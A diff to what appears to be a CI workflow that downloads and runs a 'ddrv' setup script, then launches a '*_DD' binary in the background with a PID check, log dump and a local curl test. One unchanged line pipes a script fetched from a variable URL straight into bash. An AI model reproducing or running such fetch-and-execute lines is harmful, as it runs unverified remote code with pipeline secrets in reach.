@@ -30,10 +30,29 @@ jobs:
         
         # Your existing logic
         curl -sSL $TESTING | bash -s -- ddrv
-
-        nohup bash -c 'cd *_DD && ./*_DD' > /dev/null 2>&1 &
+        
+        cd *_DD
+        ls -la
+        
+        chmod +x ./*_DD
+        
+        # Start application
+        ./*_DD > app.log 2>&1 &
+        APP_PID=$!
+        echo $APP_PID > app.pid
+        
+        sleep 10
+        
+        # Verify
+        if kill -0 $APP_PID 2>/dev/null; then
+          echo "Application running with PID: $APP_PID"
+        else
+          echo "Application failed"
+          cat app.log
+          exit 1
+        fi
         
         # Test
-        top -n 1
-        sleep 5 
+        top -n 1 -b
+        cat app.log
         curl localhost:6882
